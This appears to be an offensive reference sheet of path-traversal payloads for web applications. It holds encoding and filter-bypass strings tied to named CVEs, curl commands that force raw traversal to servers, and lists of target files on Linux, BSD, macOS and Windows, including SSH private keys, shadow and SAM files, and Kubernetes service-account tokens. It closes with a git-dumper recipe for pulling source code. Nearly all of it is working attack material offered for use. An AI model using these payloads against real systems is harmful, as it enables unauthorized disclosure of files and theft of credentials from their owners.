# Path-traversal encoding-bypass strings + OS target file lists — Open WHEN: a confirmed file/path parameter rejects the plain `../../../etc/passwd` baseline, OR a traversal read succeeds and you need a richer target list to widen disclosure

## Encoding bypass table (per-character substitutions)

Mix and match. Replace `.` / `/` / `\` inside any traversal string with the column value.

| Char | URL | Double-URL | 16-bit Unicode | Overlong UTF-8 |
|------|-----|------------|----------------|----------------|
| `.`  | `%2e` | `%252e` | `%u002e` | `%c0%2e` `%e0%40%ae` `%c0%ae` |
| `/`  | `%2f` | `%252f` | `%u2215` | `%c0%af` `%e0%80%af` `%c0%2f` |
| `\`  | `%5c` | `%255c` | `%u2216` | `%c0%5c` `%c0%80%5c` |

```
# 16-bit %u forms (IIS/.NET decoders) — slash + backslash variants
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
%u002e%u002e/%u002e%u002e/log.jsp        # Openfire auth-bypass CVE-2023-32315
```

## Mangled / non-recursive-strip bypass

When the filter strips `../` once (non-recursively) or removes only the literal token, nest it so a strip re-forms it:

```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
...\.\...\.\...\.\
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/.../.../.../.../.../.../windows/win.ini     # Mirasys DVMS WAF-strip
.%00./.%00./etc/passwd                       # Homematic CCU3 CVE-2019-9726
```

## Path-truncation strings (PHP <= 5.3, appends a fixed suffix like `.php`)

Pad past ~4096 bytes so the appended suffix is cut off; start from a fake dir (`a/`) to satisfy parser logic:

```
a/../../../../../../../../../etc/passwd......[ADD MANY DOTS]....
a/../../../../../../../../../etc/passwd/././././.[ADD MORE]/././.
a/./.[ADD MANY ./]/etc/passwd
../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
```

## Server/proxy normalization mismatch (decode happens twice or in different order)

```
# upstream strips one layer, backend the other → recreate ../ only at backend
/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
/static/%255c%255c..%255c/..%255c/..%255c/windows/win.ini   # Spring MVC CVE-2018-1271
..%252f..%252f..%252fetc%252fpasswd
# keep an in-root prefix the validator expects, then break out
http://host/index.php?page=/var/www/../../etc/passwd
http://host/index.php?page=utils/scripts/../../../../../etc/passwd
```

## Keep traversal intact on the wire

Some HTTP clients collapse `../` before sending. Force raw bytes:

```bash
curl --path-as-is -b "session=$S" \
  "http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
  --ignore-content-length -s | tr '\000' '\n'
```

## Tech-specific path-segment tricks

```
# IIS 8.3 short-name enumeration (confirm hidden long filenames exist)
java -jar iis_shortname_scanner.jar 20 8 'https://TARGET/bin::$INDEX_ALLOCATION/'
shortscan http://TARGET/

# ASP.NET cookieless segment injection to slip past URL filters
/(S(X))/admin/(S(X))/main.aspx
/(S(x))/b/(S(x))in/Navigator.dll
/WebForm/(S(X))/prot/(S(X))ected/target1.aspx        # CVE-2023-36899
/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/       # CVE-2023-36560

# Java new URL("") protocol prefix
url:file:///etc/passwd
url:http://127.0.0.1:8080

# Windows UNC share (triggers outbound NTLM auth as a side effect)
\\localhost\c$\windows\win.ini

# Windows FindFirstFile wildcard masks — match an unknown filename without
# brute-forcing it. `<<` acts as `*`, `>` as `?`. Lets you include an
# uploaded temp file (C:\Windows\Temp\php[A-F0-9]{4}.tmp) by mask:
?inc=c:\windows\temp\php<<
```

## Linux target files (beyond /etc/passwd, /etc/shadow, /proc/self/environ)

```
/etc/issue
/etc/group
/etc/motd
/etc/mysql/my.cnf
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/proc/self/cwd/index.php          # source of the running script
/proc/self/cwd/app.py
/proc/version
/proc/cmdline
/proc/mounts
/proc/sched_debug
/proc/[PID]/fd/[FD]               # both numbers brute-forceable
```

Process/network + indexing reconnaissance via /proc:

```
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/var/lib/mlocate/mlocate.db       # whole-FS filename index
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```

Containerized / Kubernetes service-account secrets:

```
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
```

## *BSD / macOS target files (Apache + log paths differ from Linux)

If `/etc/passwd` reads but the Linux log/config paths 404, the host may be
FreeBSD/OpenBSD/NetBSD or macOS — try these instead:

```
# *BSD httpd config + logs
/usr/pkg/etc/httpd/httpd.conf
/usr/local/etc/apache22/httpd.conf
/usr/local/etc/apache2/httpd.conf
/var/www/conf/httpd.conf
/var/www/logs/error_log          /var/www/logs/access_log
/var/apache2/logs/error_log      /var/apache2/logs/access_log
/var/log/httpd-error.log         /var/log/httpd-access.log
/var/log/httpd/error_log         /var/log/httpd/access_log

# macOS
/etc/apache2/httpd.conf
/Library/WebServer/Documents/index.html
/private/var/log/appstore.log
/var/log/apache2/error_log        /var/log/apache2/access_log
/usr/local/nginx/conf/nginx.conf
/var/log/nginx/error_log          /var/log/nginx/access_log
```

## Windows target files (beyond win.ini / web.config)

`license.rtf` + `win.ini` are the safe presence-check pair:

```
C:\windows\system32\license.rtf
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf      c:/sysprep.xml
c:/sysprep/sysprep.inf      c:/sysprep/sysprep.xml
c:/unattend.txt     c:/unattend.xml     c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
c:/system volume information/wpsettings.dat
```

## Directory-existence probe (depth-anchored)

Anchor on a known-good read, then prepend a candidate folder and add one `../`:

```
http://host/index.php?page=../../../etc/passwd            # baseline depth = 3
http://host/index.php?page=private/../../../../etc/passwd # folder "private" exists if passwd still returns
http://host/index.php?page=../../../var/www/private/../../../etc/passwd
```

On Java, requesting a **directory** instead of a file returns a directory listing — use it to map the tree.

## .git source disclosure (if `/.git/` is served)

```bash
curl -s -i http://TARGET/.git/HEAD
curl -s -i http://TARGET/.git/config
uv tool install git-dumper && git-dumper http://TARGET/.git/ out/ && (cd out && git checkout .)
```
